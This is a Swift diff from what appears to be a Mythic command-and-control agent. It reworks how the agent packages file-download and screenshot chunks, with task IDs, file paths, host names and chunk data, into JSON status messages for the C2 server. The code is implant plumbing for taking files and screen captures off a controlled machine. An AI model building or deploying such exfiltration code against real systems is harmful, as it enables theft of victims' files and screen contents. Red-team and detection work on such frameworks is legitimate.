@@ -203,18 +203,6 @@ func executeTask(job: Job, jobList: JobList) {
         }
         // If job already has a file_id, download a chunk of the file
         else {
-            // For download_new browser script
-            if (job.downloadChunkNumber == 1) {
-                let jsonUserOutput = JSON([
-                    "agent_file_id": job.downloadFileID,
-                    "total_chunks": job.downloadTotalChunks,
-                ])
-                job.result = jsonUserOutput.rawString() ?? ""
-            }
-            else {
-                job.result = ""
-            }
-            
             downloadChunk(job: job)
         }
     case "upload":
@@ -239,25 +227,19 @@ func executeTask(job: Job, jobList: JobList) {
             }
             // If job already has a file_id, download a chunk of the file
             else {
-                // For screencapture_new browser script
-                if (job.downloadChunkNumber == 1) {
-                    let jsonUserOutput = JSON([
-                        "file_id": job.downloadFileID,
-                        "total_chunks": job.downloadTotalChunks,
-                    ])
-                    job.result = jsonUserOutput.rawString() ?? ""
-                }
-                else {
-                    job.result = ""
-                }
                 downloadScreenshotChunk(job: job)
             }
         }
         // Successfully looped through all displays
         else {
-            job.result = ""
+            let jsonResult = JSON([
+                "total_chunks": job.downloadTotalChunks,
+                "agent_file_id": job.downloadFileID,
+            ])
+            job.result = jsonResult.rawString()!
             job.completed = true
             job.success = true
+            job.status = "success"
         }
     case "mkdir":
         makeDirectory(job: job)
@@ -385,12 +367,17 @@ func postResponse(jobList: JobList) {
             if ((job.downloadFileID == "") && (job.downloadTotalChunks > 0)) {
                 let jsonResponse = JSON([
                     "total_chunks": job.downloadTotalChunks,
-                    "task_id": job.taskID,
                     "full_path": job.downloadFullPath,
                     "host": job.downloadHost,
                     "is_screenshot": job.downloadIsScreenshot,
                 ])
-                jsonJobOutput.append(jsonResponse)
+                let jsonPayload = JSON([
+                    "task_id": job.taskID,
+                    "status": job.status,
+                    "total_chunks": job.downloadTotalChunks,
+                    "download": jsonResponse,
+                ])
+                jsonJobOutput.append(jsonPayload)
             }
             // Send file chunk
             else if((job.downloadFileID != "") && (job.downloadTotalChunks > 0)) && (job.downloadChunkData != "") {
@@ -398,10 +385,15 @@ func postResponse(jobList: JobList) {
                     "chunk_num": job.downloadChunkNumber,
                     "file_id": job.downloadFileID,
                     "chunk_data": job.downloadChunkData,
-                    "task_id": job.taskID,
                     "user_output": job.result,
                 ])
-                jsonJobOutput.append(jsonResponse)
+                let jsonPayload = JSON([
+                    "task_id": job.taskID,
+                    "status": job.status,
+                    "total_chunks": job.downloadTotalChunks,
+                    "download": jsonResponse,
+                ])
+                jsonJobOutput.append(jsonPayload)
                 job.downloadChunkNumber = job.downloadChunkNumber + 1
             }
         }
@@ -412,12 +404,17 @@ func postResponse(jobList: JobList) {
             if ((job.downloadFileID == "") && (job.downloadTotalChunks > 0)) {
                 let jsonResponse = JSON([
                     "total_chunks": job.downloadTotalChunks,
-                    "task_id": job.taskID,
                     "full_path": job.downloadFullPath,
                     "host": job.downloadHost,
                     "is_screenshot": job.downloadIsScreenshot,
                 ])
-                jsonJobOutput.append(jsonResponse)
+                let jsonPayload = JSON([
+                    "task_id": job.taskID,
+                    "status": job.status,
+                    "total_chunks": job.downloadTotalChunks,
+                    "download": jsonResponse,
+                ])
+                jsonJobOutput.append(jsonPayload)
             }
             // Send file chunk
             else if((job.downloadFileID != "") && (job.downloadTotalChunks > 0)) && (job.downloadChunkData != "") {
@@ -425,10 +422,15 @@ func postResponse(jobList: JobList) {
                     "chunk_num": job.downloadChunkNumber,
                     "file_id": job.downloadFileID,
                     "chunk_data": job.downloadChunkData,
-                    "task_id": job.taskID,
                     "user_output": job.result,
                 ])
-                jsonJobOutput.append(jsonResponse)
+                let jsonPayload = JSON([
+                    "task_id": job.taskID,
+                    "status": job.status,
+                    "total_chunks": job.downloadTotalChunks,
+                    "download": jsonResponse,
+                ])
+                jsonJobOutput.append(jsonPayload)
                 job.downloadChunkNumber = job.downloadChunkNumber + 1
             }
         }
@@ -518,7 +520,7 @@ func postResponse(jobList: JobList) {
                         // Once download is complete, reset job variables for multiple displays
                         else if (job.downloadChunkNumber > job.downloadTotalChunks) && (job.screenshotDisplayNumber < job.screenshotTotalDisplays) {
                             job.screenshotDisplayNumber += 1
-                            job.downloadFileID = ""
+                            //job.downloadFileID = ""
                             job.downloadChunkNumber = 0
                             job.downloadTotalChunks = 0
                             job.downloadFileSize = 0
@@ -534,12 +536,10 @@ func postResponse(jobList: JobList) {
                         // Save file_id returned from Mythic for first download message
                         if ((job.downloadFileID == "") && (responses["file_id"].exists())) {
                             job.downloadFileID = responses["file_id"].stringValue
-                            print("SAVING_FILEID", job.downloadFileID)
                         }
                         // Delete job if download task is complete
                         else if job.downloadChunkNumber > job.downloadTotalChunks {
                             jobList.jobs.remove(at: index)
-                            print("download job removed")
                         }
                         // Error may have occurred when getting file_id from Mythic, remove the job
                         else if job.downloadTotalChunks == 0 {
